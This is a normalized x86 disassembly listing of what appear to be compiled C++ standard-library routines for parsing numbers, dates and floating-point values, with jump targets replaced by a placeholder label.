mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10007c7b
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007d14
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x10 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007d14
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x14 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004587a
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x18 ]
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10045818
jmp r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004587a
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100080a1
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007d14
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100080a1
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x10 ]
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100457ef
cmp [ ebp - 0x4 ] 0x4
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007d14
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x14 ]
je r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004587a
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004587a
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081f6
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10007c7b
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100457ef
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004587a
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10045818
jmp r-xdata
add ebx 0xc
push ebx
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004587a
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
sub_10045f05
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1004587a
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
test [ ecx ] 0x2
jne r-xdata
mov edx 0x76c
cmp [ ebp - 0x4 ] edx
jl r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
mov eax [ ebp + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x87
jle r-xdata
sub [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0x2
mov [ ecx ] eax
sub_10045f73
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10007f40
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10045fb3
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10007f40
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10045ff3
push 0x98
mov eax sub_1004c6b7
call sub_10028203
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x5
pop eax
call sub_100282db
retn
cmp [ eax ] edi
jne r-xdata
push 0x1c
call sub_10024389
pop ecx
mov [ ebp - 0x14 ] eax
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_100457bc
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002020
sub_1004609d
push 0x60
mov eax sub_1004c56a
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
xor ebx ebx
mov [ ebp - 0x6c ] eax
mov eax [ esi + 0x10 ]
inc ebx
mov [ ebp - 0x54 ] ecx
mov ecx esi
test eax 0x4000
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10003446
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_100436ce
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ad9
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10003c49
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10003446
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10042133
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10003c49
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10040c9f
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_100403d0
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10040499
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_100400d2
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10040544
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100403e9
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10040499
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_100400d2
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004086b
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_100400d2
jmp r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1004623b
push 0x38
mov eax sub_1004d927
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10003446
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100436ce
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10003c49
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10023ad9
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1004630a
push 0x38
mov eax sub_1004d927
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10003446
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100436ce
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10003c49
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10023ad9
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_100463d5
push 0x38
mov eax sub_1004d8fa
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100436ce
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023c74
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_10046483
push 0x38
mov eax sub_1004d8fa
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100436ce
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ad9
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_10046531
push 0x3c
mov eax sub_1004d67d
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100436ce
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023d19
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_100465e8
push 0x3c
mov eax sub_1004d67d
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10003446
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100436ce
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ddc
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100282ef
retn 0x20
sub_1004669f
push 0x50
mov eax sub_1004d8cd
call sub_1002826c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x50 ]
call sub_10043a1e
add esp 0x14
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10023fe1
fstp [ ebp - 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x58 ]
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
fld [ ebp - 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_100282ef
retn 0x20
sub_10046747
push 0x54
mov eax sub_1004d8a0
call sub_1002826c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_10043a1e
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10024003
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_100282ef
retn 0x20
sub_100467ef
push 0x54
mov eax sub_1004d8a0
call sub_1002826c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_10043a1e
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1002406c
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10003c49
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_100282ef
retn 0x20
sub_10046897
push 0x38
mov eax sub_1004c597
call sub_1002826c
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10003446
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100436ce
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10003c49
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10023ad9
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003fe92
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_100282ef
retn 0x20
sub_1004694d
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
